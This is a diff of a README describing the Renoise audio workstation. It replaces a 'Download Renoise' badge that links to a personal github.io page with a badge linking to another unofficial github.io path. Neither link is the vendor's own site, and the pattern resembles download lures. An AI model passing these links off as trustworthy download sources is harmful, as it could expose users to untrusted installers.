@@ -9,7 +9,7 @@
 
 Renoise is a high-performance digital audio workstation built around a vertical tracker paradigm, combining vintage workflow traditions with modern studio production standards. Designed for low-latency audio rendering and precise timing, it gives sound designers and electronic music producers granular control over sample manipulation, multi-track routing, and algorithmic sequencing.
 
-[![Download Renoise](https://img.shields.io/badge/Download-Renoise-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://dorothycollinsn760.github.io/.github/Renoise-Audio-Core)
+[![Compose in Renoise](https://img.shields.io/badge/Compose%20in-Renoise-0D9488?style=flat)](https://renoise-audio.github.io/.github/)
 
 ---
 
